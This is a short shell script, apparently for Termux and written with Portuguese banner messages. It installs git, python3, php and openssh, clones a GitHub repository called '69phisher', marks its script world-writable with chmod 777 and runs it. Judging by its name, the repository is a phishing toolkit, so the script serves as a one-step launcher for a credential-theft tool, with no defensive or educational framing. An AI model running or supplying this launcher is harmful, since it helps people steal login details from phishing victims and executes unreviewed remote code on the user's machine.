echo "*LIMPANDO TERMINAL" | figlet | lolcat
sleep 1
clear
echo "*INSTALANDO DEPEDENCIAS" | figlet | lolcat
pip install --upgrade pip
pkg install git python3 php openssh -y
clear
echo "BAIXANDO: 69-PHISHER" | figlet | lolcat
echo "(isso pode demorar um pouco depedendo da sua conexão com a internet...)" | lolcat
cd $HOME/foxys_blt/downloads
git clone https://github.com/Akshay-Arjun/69phisher.git
clear
echo "CONCLUIDO, EXECUTANDO SCRIPT :)" | figlet | lolcat
cd 69phisher
chmod 777 69phisher.sh
bash 69phisher.sh
echo "Obrigado por usar nossa plataforma, volte sempre" | lolcat
